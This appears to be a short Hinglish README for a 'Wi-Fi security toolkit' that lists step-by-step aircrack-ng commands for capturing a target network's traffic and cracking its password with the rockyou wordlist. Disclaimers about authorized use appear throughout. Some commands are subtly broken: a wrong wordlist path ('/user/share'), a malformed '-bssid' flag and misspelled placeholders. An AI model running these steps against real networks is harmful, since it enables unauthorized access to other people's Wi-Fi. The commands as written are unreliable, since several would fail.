亗 SALEEM WIFI TOOLKIT 亗

<p align="center">
  **⚡ WI-FI SECURITY COMMANDS ⚡**Kali Linux • Ethical Hacking • Learning

</p>---

⚠️ IMPORTANT

Use these commands only on your own network or in an authorized testing lab. Never test networks without permission.

---

亗 STEP 01 — CHECK WIRELESS INTERFACE

Command:

iwconfig

Work:
Wireless interface ki information check karta hai.

---

亗 STEP 02 — START MONITOR MODE

Command:

sudo airmon-ng start wlan0

Work:
Wireless adapter par monitor mode start karne ke liye hota hai.

---

亗 STEP 03 — VIEW WIRELESS NETWORKS

Command:

airodump-ng wlan0mon

Work:
Monitor-mode interface se wireless network information observe karta hai.

Stop Process:

Ctrl + C

Work:
Running process ko stop karta hai.

---

亗 STEP 04 — TARGET-SPECIFIC PACKET CAPTURE

Original command:

airodump-ng -c enter_your_tirget_channil --bssid enter_your_tirget_BSSID -w capture wlan0mon

Work:
Specified channel aur BSSID ke liye wireless packet capture ka command hai. Sirf authorized lab testing ke liye.

---

亗 STEP 05 — WORDLIST DIRECTORY

Original command:

cd /user/share/wordlists

Work:
Wordlist directory mein jane ke liye diya gaya command hai.

---

亗 STEP 06 — EXTRACT COMPRESSED WORDLIST

Original command:

sudo gzip -d rockyou.txt.gz

Work:
Compressed "rockyou.txt.gz" file ko extract karne ke liye hai.

---

亗 STEP 07 — PASSWORD AUDIT

Original command:

aircrack-ng -w /user/share/wordlists/rockyou.txt -bssid enter_your_tirget_BSSID capture-01.cap

Work:
Capture file aur wordlist ke zariye Wi-Fi password audit karne ka command hai. Unauthorized networks par use na karein.

---

亗 PROJECT INFORMATION

Detail| Information
Project| SALEEM WIFI TOOLKIT
Platform| Kali Linux
Category| Wi-Fi Security
Purpose| Educational
License| MIT

---

<p align="center">亗 SALEEM TOOLKIT 亗

LEARN ETHICALLY • PRACTICE LEGALLY • STAY SAFE

</p>
